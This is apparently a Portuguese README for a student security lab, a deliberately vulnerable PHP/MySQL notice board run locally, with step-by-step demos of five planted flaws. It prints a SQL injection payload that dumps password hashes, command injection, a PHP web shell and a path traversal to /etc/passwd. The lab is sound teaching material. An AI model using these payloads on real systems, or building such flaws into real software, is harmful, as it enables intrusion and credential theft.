# USP Avisos — Parte 1

Mural interno de avisos para o projeto de **Engenharia de Segurança**. O ambiente sobe com **Docker Compose** (Apache, **PHP 5.6.40**, **MySQL 5.7**) e contém **falhas intencionais** para estudo e demonstração.

**Aviso:** use apenas em máquina local (`localhost`). Não publique na internet nem trate como sistema real.


| Item                     | Valor                                                                      |
| ------------------------ | -------------------------------------------------------------------------- |
| URL                      | `http://localhost:8080/login.php`                                          |
| Porta no host            | **8080** (MySQL **não** é exposto no host)                                 |
| Relatório formal (LaTeX) | `relatorio/main.tex` → compilar para PDF                                   |
| Teste automático         | `./tests/fluxo.sh` → `[OK]`/`[ERRO]` em cada passo; saída 0 se tudo passou |


---



## 1. Instalação e subida

1. **Docker Desktop** instalado e em execução. No Windows, use backend **WSL2**. No Mac, espere o ícone da baleia ficar estável na barra.
2. Abra o terminal **dentro** da pasta do projeto (onde está o `docker-compose.yml`), não na pasta pai.
3. Suba os containers:

```bash
docker compose up -d --build
```

Na primeira vez: download de imagens, build do PHP com `mysqli`, e no **Apple Silicon** o MySQL 5.7 sobe emulado (`platform: linux/amd64` no Compose) — pode levar vários minutos até o `db` ficar **healthy**.

1. Confira:

```bash
docker compose ps
docker compose exec web php -v   # deve mostrar PHP 5.6.40
```

Em `docker compose ps`, espere algo como `0.0.0.0:8080->80/tcp` no serviço **web** e **sem** `0.0.0.0:3306` no host.

1. Abra no navegador: `http://localhost:8080/login.php`



### Parar ou zerar o banco

```bash
docker compose down          # para os containers
docker compose down -v       # apaga o volume do banco (recria tabelas na próxima subida)
```

Sem `-v`, avisos e usuários já criados permanecem. Com `-v`, o MySQL recria tudo a partir de `sql/init.sql` e `site/bin/criar-usuarios.php` roda de novo na subida.

### Recarregar o serviço web

Se o site não refletir o que você espera (login estranho, Apache “preso”, ou quiser repetir a rotina de subida do PHP), reinicie só o container **web**:

```bash
docker compose restart web
```

Na subida, o `docker/entrada.sh` tenta de novo o `site/bin/criar-usuarios.php` (usuários de demo e limpeza de legado no banco). A pasta `site/` já é montada ao vivo; o restart ajuda quando o processo web precisa ser recriado, não para “salvar” cada edição de `.php`.

---



## 2. Usuários de demonstração

Senha **igual para todos:** `aviso123`


| Nome   | E-mail             |
| ------ | ------------------ |
| Ivan   | `ivan@avisos.br`   |
| Daniel | `daniel@avisos.br` |
| Pedro  | `pedro@avisos.br`  |


Domínio `avisos.br` é fictício (laboratório).

Conta sugerida para o **fluxo normal** e para a maior parte dos testes: **Ivan**.

---



## 3. O que o site faz (fluxo normal)

Após login:

- **Avisos** — lista e busca por título  
- **Publicar** — novo aviso  
- **Impressora** — teste de alcance de rede (laboratório)  
- **Modelos** — visualização de modelos de aviso  
- **Anexos** — envio de arquivos  
- **Meu usuário** / **Sair**

**Prova rápida:** entre como Ivan, publique um aviso, confira o nome **Ivan** na lista.

---



## 4. Arquitetura (resumo)

- **web:** PHP 5.6.40 + Apache; pasta `site/` montada em `/var/www/html`  
- **db:** MySQL 5.7; hostname `db` na rede interna do Compose  
- Configuração entregue: `apache/000-default.conf`, `mysql/my.cnf`, `docker-compose.yml`, `Dockerfile`  
- SQL inicial: `sql/init.sql`; dump com dados após uso: `sql/dados.sql` (gerado com `mysqldump`, ver relatório)

---



## 5. Falhas intencionais (visão geral)


| Falha                 | Onde                             | Efeito principal                               |
| --------------------- | -------------------------------- | ---------------------------------------------- |
| Autenticação fraca    | `site/login.php`                 | Entrar como outro usuário sem a senha correta  |
| SQL injection (busca) | `site/avisos.php`                | Vazar dados do banco (demo principal da banca) |
| Injeção de comando    | `site/impressora.php`            | Executar comando no servidor (`www-data`)      |
| Upload executável     | `site/anexo.php`, `site/anexos/` | Web shell PHP no servidor                      |
| LFI                   | `site/modelo.php`                | Ler arquivos do disco (ex.: `/etc/passwd`)     |


Detalhes técnicos, impacto, mitigação e referências IEEE: `relatorio/texto/conteudo.tex` (compilar `relatorio/main.tex`).

---



## 6. Conferir antes da prova (`tests/fluxo.sh`)

Rode isto **depois** de `docker compose up` e **antes** de demonstrar as falhas para a banca. O script confirma que o mural responde, que o fluxo normal funciona e que as cinco vulnerabilidades ainda estão exploráveis no ambiente.

Cada passo imprime `[OK] descrição` ou `[ERRO] descrição`. O script **não para** no primeiro erro: executa tudo e, no final, indica se o ambiente está pronto. Código de saída **0** só se não houve nenhum `[ERRO]`.

**Pré-requisito:** containers no ar e `http://localhost:8080` acessível na máquina onde você roda o comando.

```bash
chmod +x tests/fluxo.sh
./tests/fluxo.sh
```

**O que ele verifica (resumo):** container `web` e PHP 5.6.40 (se `docker` estiver no PATH); login Ivan; publicar e listar aviso; páginas do menu autenticado; SQL `UNION` na busca; login fraco (Daniel com senha errada); comando na Impressora; upload de `.php` em anexos; LFI de `/etc/passwd`. O teste de upload deixa `site/anexos/fluxo-probe-<timestamp>.php` — pode apagar depois.

Se algo falhar, use a seção **8. Problemas comuns** antes de seguir para a demonstração manual abaixo.

---



## 7. Demonstração das vulnerabilidades

Use a conta **Ivan** (`ivan@avisos.br` / `aviso123`) salvo onde indicado outro usuário. Mostre primeiro o fluxo normal (seção 3), depois cada falha. O relatório técnico está em `relatorio/texto/conteudo.tex`.

### 7.1 Autenticação fraca

**O que é:** depois de tentar o login “correto”, o site ainda aceita entrar só com e-mail válido e **qualquer senha não vazia**, sem verificar o hash.

**Onde está:** `site/login.php` (condição com `definir_sessao_por_email()`) e `site/includes/auth.php`.

**Como demonstrar:**

1. Abra `http://localhost:8080/login.php` (ou **Sair** se já estiver logado).
2. E-mail: `daniel@avisos.br`. Senha: qualquer texto, por exemplo `123` (não use `aviso123`).
3. Clique **Entrar** — deve ir para **Avisos** sem mensagem de erro.
4. Abra **Meu usuário** e mostre o nome **Daniel** e o e-mail `daniel@avisos.br`.
5. (Opcional) Abra `login.php` e `auth.php` e aponte a segunda condição do `if` no POST do login.

**O que a banca deve ver:** personificação de outro usuário do mural sem saber a senha real.

### 7.2 Injeção SQL na busca (demonstração principal)

**O que é:** com busca preenchida, a listagem usa SQL montado por concatenação em `buscar_titulo_montado()`; um atacante pode injetar um `UNION` e exibir colunas de outras tabelas (por exemplo `usuarios`).

**Onde está:** `site/avisos.php` — compare com `listar_avisos()` em `site/includes/avisos.php` (consulta preparada), usada quando a busca está vazia.

**Como demonstrar:**

1. Login como **Ivan**.
2. Menu **Avisos**.
3. No campo **Buscar no título**, cole exatamente (incluindo aspas e `#` no final):

```text
x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#
```

4. Clique **Buscar**.
5. Mostre na página e-mails (`@avisos.br`) e hashes (`$2y$...`) que **não** aparecem na listagem normal sem busca.
6. (Opcional) Mostre no código a linha do `LIKE '%" . $busca . "%'` em `buscar_titulo_montado()`.

**O que a banca deve ver:** vazamento de dados do banco pela interface web.

**Terminal (opcional, mesmo payload):**

```bash
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' \
  http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -G --data-urlencode \
  "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
  http://localhost:8080/avisos.php | less
rm -f "$jar"
```

### 7.3 Injeção de comando (Impressora)

**O que é:** o campo “servidor” é concatenado em `shell_exec('ping -c 2 ' . $host)`, permitindo encadear comandos com `;`.

**Onde está:** `site/impressora.php`.

**Como demonstrar:**

1. Login como **Ivan**.
2. Menu **Impressora**.
3. No campo **Servidor**, digite: `127.0.0.1; whoami` (ou `127.0.0.1; id`).
4. Clique **Testar**.
5. Na caixa de saída (`<pre>`), mostre a linha com `www-data` (ou a saída de `id`).

**Terminal (equivalente):**

```bash
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d 'email=ivan@avisos.br&senha=aviso123' http://localhost:8080/login.php
curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' \
  http://localhost:8080/impressora.php
rm -f "$jar"
```

**O que a banca deve ver:** execução de comando no servidor web (intrusão pelo PHP), usuário do processo Apache.

### 7.4 Upload de arquivo executável (web shell)

**O que é:** anexos são gravados em `site/anexos/` com o nome original, sem bloquear `.php`; o Apache pode executar o arquivo pela URL pública.

**Onde está:** `site/anexo.php` e diretório `site/anexos/`.

**Como demonstrar:**

1. Login como **Ivan**.
2. Crie no seu computador um arquivo `cmd.php` com:

```php
<?php echo shell_exec($_GET["c"]); ?>
```

3. Menu **Anexos** → escolha `cmd.php` → **Enviar** (mensagem de sucesso com `anexos/cmd.php`).
4. No navegador abra: `http://localhost:8080/anexos/cmd.php?c=id`
5. Mostre a saída com `uid=` / `www-data`.
6. Após a demo, apague `site/anexos/cmd.php` no projeto se não quiser deixar a shell no disco.

**O que a banca deve ver:** persistência — ponto de execução remota reutilizável no servidor.

### 7.5 Inclusão de arquivo local (LFI)

**O que é:** `modelo.php` inclui o parâmetro `modelo` a partir de `site/modelos/` sem impedir `..`; é possível ler arquivos fora da pasta (por exemplo `/etc/passwd`).

**Onde está:** `site/modelo.php`.

**Como demonstrar:**

1. Login como **Ivan** (necessário para a página).
2. No navegador, abra:

```text
http://localhost:8080/modelo.php?modelo=../../../../etc/passwd
```

3. Mostre linhas como `root:` no corpo da página.
4. (Opcional) Compare com os links legítimos `modelo=padrao.php` e `modelo=urgente.php` na mesma tela.

**O que a banca deve ver:** leitura de arquivo do sistema de arquivos do container via parâmetro GET.

### 7.6 Encerramento sugerido

Reforce: ambiente só local; falhas intencionais para a disciplina; mitigações no relatório (`relatorio/main.tex`). Se a banca pedir, rode de novo `./tests/fluxo.sh` para mostrar que tudo ainda responde.

---



## 8. Problemas comuns


| Problema                  | O que fazer                                                                           |
| ------------------------- | ------------------------------------------------------------------------------------- |
| Página não abre           | Docker Desktop ligado? `docker compose ps` com `web` running?                         |
| Login falha               | `docker compose logs web` e `db`; aguardar `db` healthy; `docker compose restart web` |
| Busca SQL vazia           | Está logado? Payload completo com `#` no final?                                       |
| Upload não executa        | Arquivo `.php`? URL `/anexos/nome.php`?                                               |
| Usuários antigos no banco | `docker compose down -v` e subir de novo                                              |


---



## 9. Arquivos principais

```
docker-compose.yml   Dockerfile   docker/entrada.sh
apache/000-default.conf   mysql/my.cnf
sql/init.sql   site/   tests/fluxo.sh
relatorio/main.tex        RELATORIO.md (ponte para o LaTeX)
```

